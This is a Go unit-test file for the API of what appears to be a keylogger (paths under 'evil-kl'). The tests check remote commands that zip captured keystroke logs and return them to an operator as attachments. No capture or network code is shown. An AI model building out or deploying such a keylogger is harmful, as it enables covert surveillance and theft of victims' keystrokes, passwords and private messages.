package api

import (
	"os"
	"testing"
)

func TestApi_bodyBuilder(t *testing.T) {
	type args struct {
		method   string
		trgtPath string
		files    []string
	}
	tests := []struct {
		name  string
		a     *Api
		args  args
		want  string
		want1 string
	}{
		// TODO: Add test cases.
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, got1 := tt.a.bodyBuilder(tt.args.method, tt.args.trgtPath, tt.args.files)
			if got != tt.want {
				t.Errorf("Api.bodyBuilder() got = %v, want %v", got, tt.want)
			}
			if got1 != tt.want1 {
				t.Errorf("Api.bodyBuilder() got1 = %v, want %v", got1, tt.want1)
			}
		})
	}
}

func TestApi_Ping(t *testing.T) {
	type args struct {
		method string
	}
	tests := []struct {
		name  string
		a     *Api
		args  args
		want  string
		want1 string
	}{
		{
			name: "success ping service",
			a: new(Api).Create("C:\\temp\\evil-kl\\result.zip",
				"C:\\temp\\evil-kl\\servicelogs\\logs.txt",
				"C:\\temp\\evil-kl\\keylogger\\keylogger.txt",
			),
			args: args{
				method: "ping",
			},
			want:  "{\"method\":\"ping\",\"text\":\"OK\"}",
			want1: "",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, got1 := tt.a.Ping(tt.args.method)
			if got != tt.want {
				t.Errorf("Api.Ping() got = %v, want %v", got, tt.want)
			}
			if got1 != tt.want1 {
				t.Errorf("Api.Ping() got1 = %v, want %v", got1, tt.want1)
			}
		})
	}
}

func TestApi_GetLogs(t *testing.T) {
	type args struct {
		method string
	}
	tests := []struct {
		name  string
		a     *Api
		args  args
		want  string
		want1 string
	}{
		{
			name: "success get logs",
			a:    new(Api).Create("result.zip", "logs.txt", "keylogger.txt"),
			args: args{
				method: "getLogs",
			},
			want:  "{\"method\":\"getLogs\",\"text\":\"See your attachments\"}",
			want1: "result.zip",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f, _ := os.OpenFile("logs.txt", os.O_CREATE, 0600)
			f.Close()

			got, got1 := tt.a.GetLogs(tt.args.method)
			if got != tt.want {
				t.Errorf("Api.GetLogs() got = %v, want %v", got, tt.want)
			}
			if got1 != tt.want1 {
				t.Errorf("Api.GetLogs() got1 = %v, want %v", got1, tt.want1)
			}

			os.Remove("logs.txt")
			os.Remove("result.zip")
		})
	}
}

func TestApi_GetKeyloggerData(t *testing.T) {
	type args struct {
		method string
	}
	tests := []struct {
		name  string
		a     *Api
		args  args
		want  string
		want1 string
	}{
		{
			name: "success keylogger logs",
			a:    new(Api).Create("result.zip", "logs.txt", "keylogger.txt"),
			args: args{
				method: "getKeyloggerData",
			},
			want:  "{\"method\":\"getKeyloggerData\",\"text\":\"See your attachments\"}",
			want1: "result.zip",
		},
		{
			name: "archiving error",
			a:    new(Api).Create("", "logs.txt", "keylogger.txt"),
			args: args{
				method: "getKeyloggerData",
			},
			want:  "{\"method\":\"getKeyloggerData\",\"error\":\"Archiving error: open : The system cannot find the file specified.\"}",
			want1: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if tt.name == "success keylogger logs" {
				f, _ := os.OpenFile("keylogger.txt", os.O_CREATE, 0600)
				f.Close()
			}

			got, got1 := tt.a.GetKeyloggerData(tt.args.method)
			if got != tt.want {
				t.Errorf("Api.GetKeyloggerData() got = %v, want %v", got, tt.want)
			}
			if got1 != tt.want1 {
				t.Errorf("Api.GetKeyloggerData() got1 = %v, want %v", got1, tt.want1)
			}

			os.Remove("keylogger.txt")
			os.Remove("result.zip")
		})
	}
}
